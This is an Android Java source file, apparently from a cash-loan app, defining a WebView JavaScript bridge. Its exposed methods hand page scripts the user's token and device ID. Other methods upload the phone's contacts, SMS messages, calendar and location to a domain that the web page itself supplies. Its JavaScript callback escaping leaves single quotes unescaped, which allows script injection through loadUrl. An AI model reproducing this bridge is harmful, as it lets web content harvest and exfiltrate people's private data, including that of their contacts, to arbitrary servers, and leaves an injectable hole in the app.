package com.cashhub.cash.app;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.webkit.JavascriptInterface;

import android.webkit.WebView;
import com.alibaba.fastjson.JSONObject;
import com.cashhub.cash.common.CommonApi;
import com.cashhub.cash.common.KndcEvent;
import com.cashhub.cash.common.KndcStorage;
import com.cashhub.cash.common.UploadData;
import com.cashhub.cash.common.utils.CommonUtil;
import com.cashhub.cash.common.utils.DeviceUtils;
import com.tencent.sonic.sdk.SonicDiffDataCallback;
import org.greenrobot.eventbus.EventBus;

/**
 * Sonic javaScript Interface (Android API Level >= 17)
 */

public class SonicJavaScriptInterface {
  private static final String TAG = "JavaScriptMethods";

  private Context mContext;
  private WebView mWebView;

  private final SonicSessionClientImpl mSessionClient;

  private final Intent mIntent;

  public static final String PARAM_CLICK_TIME = "clickTime";

  public static final String PARAM_LOAD_URL_TIME = "loadUrlTime";

  private UploadData mUploadData;

  private CommonApi mCommonApi;

  public SonicJavaScriptInterface(Context context, WebView webView,
      SonicSessionClientImpl sessionClient,
      Intent intent) {
    this.mContext = context;
    this.mWebView = webView;
    this.mSessionClient = sessionClient;
    this.mIntent = intent;
  }


  /**
   * 清理登录信息
   */
  @JavascriptInterface
  public void clearLoginInfo() {
    CommonApi.getInstance().clearLoginInfo(mContext);
  }


  /**
   * 上传图片
   * @param lineType 值有ocr和living，ocr为身份证上传页面，living为人脸识别页面
   * @param uploadType 值有1，2，3。这个值由h5传过来，上传完图片再传回去
   * @param type 值有album和camera，album为相册，camera为相机
   */
  @JavascriptInterface
  public void uploadImage(String lineType, String uploadType, String type) {
    Log.d(TAG, "uploadImage: start!!! lineType:" + lineType + ", uploadType:" + uploadType + ", type:" + type);
    //参数校验
    if(TextUtils.isEmpty(lineType) || TextUtils.isEmpty(uploadType) || TextUtils.isEmpty(type)) {
      return;
    }
    if(!type.equals("album") && !type.equals("camera")) {
      return;
    }

    KndcStorage.getInstance().setData(BaseActivity.LINE_TYPE, lineType);
    KndcStorage.getInstance().setData(BaseActivity.UPLOAD_TYPE, uploadType);
    KndcEvent kndcEvent = new KndcEvent();
    kndcEvent.setEventName((type.equals("camera")) ? KndcEvent.OPEN_CAMARA : KndcEvent.OPEN_IMAGE_CAPTURE);
    kndcEvent.setLineType(lineType);
    kndcEvent.setUploadType(uploadType);
    EventBus.getDefault().post(kndcEvent);
  }

  /**
   * 获取设备信息
   */
  @JavascriptInterface
  public JSONObject getSystemInfo() {
    return DeviceUtils.getSystemInfo(mContext);
  }


  /**
   * 获取用户Token
   */
  @JavascriptInterface
  public String getUserToken() {
    return KndcStorage.getInstance().getData(KndcStorage.USER_TOKEN);
  }

  /**
   * 获取设备号
   */
  @JavascriptInterface
  public String getDeviceId() {
    return DeviceUtils.getDeviceId(mContext);
  }

  /**
   * 获取状态栏高度
   */
  @JavascriptInterface
  public int getStatusBarHeight() {
    return CommonUtil.getStatusBarHeight(mContext);
  }

  /**
   * 获取标题栏高度
   */
  @JavascriptInterface
  public int getTitleBarHeight() {
    return CommonUtil.getTitleBarHeight(mContext);
  }

  /**
   * 数据上报/埋点功能调用
   */
  @JavascriptInterface
  public void trackData(JSONObject requestJson, String token) {
    try {
      //初始化数据
      if (mCommonApi == null) {
        mCommonApi = new CommonApi();
      }
      mCommonApi.trackData(mContext, requestJson, token);
    } catch (Exception e) {
      Log.d(TAG, e.getMessage());
    }
  }

  /**
   * 上报设备信息
   */
  @JavascriptInterface
  public void getAndSendDevice(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    try {
      //初始化数据
      if (this.mUploadData == null) {
        this.mUploadData = new UploadData(mContext);
      }
      this.mUploadData.getAndSendDevice(systemInfo, token, domain, timeStamp, deviceKey);
    } catch (Exception e) {
      Log.d(TAG, e.getMessage());
    }
  }

  /**
   * 手机上报通讯录
   */
  @JavascriptInterface
  public void getAndSendContact(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendContact(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报短信信息
   */
  @JavascriptInterface
  public void getAndSendSms(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报日历
   */
  @JavascriptInterface
  public void getAndSendCalendar(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendCalendar(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报定位
   */
  @JavascriptInterface
  public void getAndSendMap(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    try {
      //初始化数据
      if (this.mUploadData == null) {
        this.mUploadData = new UploadData(mContext);
      }

      this.mUploadData.getAndSendLocation(systemInfo, token, domain, timeStamp, deviceKey);
    } catch (Exception e) {
      Log.d(TAG, e.getMessage());
    }
  }

  /**
   * 手机上报定位
   */
  @JavascriptInterface
  public void getAndSendLocation(JSONObject systemInfo, String token, String domain,
      long timeStamp, String deviceKey) {
    try {
      //初始化数据
      if (this.mUploadData == null) {
        this.mUploadData = new UploadData(mContext);
      }
      this.mUploadData.getAndSendLocation2(systemInfo, token, domain, timeStamp,
          deviceKey);
    } catch (Exception e) {
      Log.d(TAG, e.getMessage());
    }
  }

  @JavascriptInterface
  public void getDiffData() {
    // the callback function of demo page is hardcode as 'getDiffDataCallback'
    getDiffData2("getDiffDataCallback");
  }

  @JavascriptInterface
  public void getDiffData2(final String jsCallbackFunc) {
    if (null != mSessionClient) {
      mSessionClient.getDiffData(new SonicDiffDataCallback() {
        @Override
        public void callback(final String resultData) {
          Runnable callbackRunnable = new Runnable() {
            @Override
            public void run() {
              String jsCode = "javascript:" + jsCallbackFunc + "('"+ toJsString(resultData) + "')";
              mSessionClient.getWebView().loadUrl(jsCode);
            }
          };
          if (Looper.getMainLooper() == Looper.myLooper()) {
            callbackRunnable.run();
          } else {
            new Handler(Looper.getMainLooper()).post(callbackRunnable);
          }
        }
      });
    }
  }

  @JavascriptInterface
  public String getPerformance() {
    long clickTime = mIntent.getLongExtra(PARAM_CLICK_TIME, -1);
    long loadUrlTime = mIntent.getLongExtra(PARAM_LOAD_URL_TIME, -1);
    try {
      JSONObject result = new JSONObject();
      result.put(PARAM_CLICK_TIME, clickTime);
      result.put(PARAM_LOAD_URL_TIME, loadUrlTime);
      return result.toString();
    } catch (Exception e) {

    }

    return "";
  }

  /*
   * * From RFC 4627, "All Unicode characters may be placed within the quotation marks except
   * for the characters that must be escaped: quotation mark,
   * reverse solidus, and the control characters (U+0000 through U+001F)."
   */
  private static String toJsString(String value) {
    if (value == null) {
      return "null";
    }
    StringBuilder out = new StringBuilder(1024);
    for (int i = 0, length = value.length(); i < length; i++) {
      char c = value.charAt(i);


      switch (c) {
        case '"':
        case '\\':
        case '/':
          out.append('\\').append(c);
          break;

        case '\t':
          out.append("\\t");
          break;

        case '\b':
          out.append("\\b");
          break;

        case '\n':
          out.append("\\n");
          break;

        case '\r':
          out.append("\\r");
          break;

        case '\f':
          out.append("\\f");
          break;

        default:
          if (c <= 0x1F) {
            out.append(String.format("\\u%04x", (int) c));
          } else {
            out.append(c);
          }
          break;
      }

    }
    return out.toString();
  }

  /**
   * 页面跳转
   */
  @JavascriptInterface
  public void jsNavigateTo(String url) {
    CommonApp.navigateTo(mContext, url);
  }

  /**
   * 打开登录页
   */
  @JavascriptInterface
  public void jsNavigateToLogin() {
    CommonApp.navigateToLogin(mContext);
  }
}

